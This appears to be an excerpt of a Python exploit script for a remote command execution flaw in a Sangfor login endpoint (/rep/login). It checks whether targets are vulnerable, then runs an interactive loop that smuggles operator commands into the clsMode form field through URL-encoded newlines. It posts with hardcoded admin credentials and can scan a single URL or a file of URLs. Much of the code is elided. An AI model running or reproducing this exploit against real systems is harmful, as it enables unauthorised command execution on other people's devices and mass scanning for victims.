...
def check_vuln(url):
	...
	url1 = url.scheme + '://' + url.netloc + '/rep/login'
	...
	try:
		...
		res = requests.post(url1,headers=headers,data=data,timeout=20,verify=False)
	...
	if check_vuln(url) == 1:
		...
		while 1:
			...
			if cmd =="exit":
				...
				data ='''clsMode=cls_mode_login%0A{}%0A&index=index&log_type=report&loginType=account&page=login&rnd=0&userID=admin&userPsw=123'''.format(cmd)
				try:
					res = requests.post(url1,data=data,headers=headers,timeout=20,verify=False)
					#poc部分给的有解释
...
if __name__ == '__main__':
	...
	print("\nsangfor_login_rce scan by when\n")

	arg=ArgumentParser(description='check_url By when')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:python3 sangfor-login-rce.py -u http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="url_list; Example:python3 sangfor-login-rce.py -f url.txt")
	arg.add_argument("-c",
					"--cmd",
					help="command; Example:python3 sangfor-login-rce.py -c http://ip:port")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	cmd=args.cmd
